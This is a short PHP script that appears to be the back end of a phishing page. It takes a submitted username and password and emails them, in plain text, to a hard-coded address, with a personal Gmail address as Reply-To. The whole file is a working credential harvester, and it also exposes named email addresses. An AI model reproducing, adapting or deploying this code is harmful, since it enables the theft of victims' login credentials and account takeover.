
<?php
  $username = $_POST['username'];
  $password = $_POST['pw'];

	$email_from = 'bjcoffey@aep.com';
	$email_subject = "New Form submission";
	$email_body = "You have received a new message from the user $username.\n".
													"Here is the message:\n $password".

  $to = "bjcoffey@aep.com";
  $headers = "From: $email_from \r\n";
  $headers .= "Reply-To: bryancoffey220@gmail.com \r\n";
  mail($to,$email_subject,$email_body,$headers);
?>